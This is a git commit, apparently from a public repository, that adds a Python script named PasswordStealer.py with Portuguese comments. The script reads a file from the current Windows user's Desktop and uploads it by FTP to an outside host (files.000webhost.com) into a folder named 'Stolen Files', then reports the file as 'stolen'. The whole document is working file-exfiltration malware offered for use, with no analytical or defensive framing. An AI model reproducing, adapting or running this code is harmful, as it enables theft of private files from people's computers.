b2585120c03b956ed835b66de28bfd080214c6c9
dock0d1 <43358190+dock0d1@users.noreply.github.com>
2021-03-08 09:31:36 -0300

    Add files via upload

---
+++ PasswordStealer.py
@@ -0,0 +1,24 @@
+import os
+import math
+import random	
+import string
+import ftplib
+import time
+
+def id_generator(size=25,chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
+	return ''.join(random.choice(chars) for _ in range(size))
+
+user = os.getlogin() #Usuario
+filelocation = "C:/Users/" + user + "/Desktop/ExampleFile.txt" #Arquivo
+FTPservername = "nomequalquer"
+FTPserverpass = "senhaqualquer"
+FTPserverhost = "files.000webhost.com"
+filerandomname = id_generator()
+
+FTP = ftplib.FTP(FTPserverhost,FTPservername,FTPserverpass) #Faz a conexão
+file = open(filelocation,"rb") #Abra o arquivo com o sinalizador rb. (read binary)
+FTP.storbinary("STOR /Stolen Files/" + filerandomname,file) #Armazena um binário (o arquivo)
+FTP.quit() #Desconecta-se do servidor.
+
+print("Arquivo roubado com sucesso!!")
+time.sleep(5)
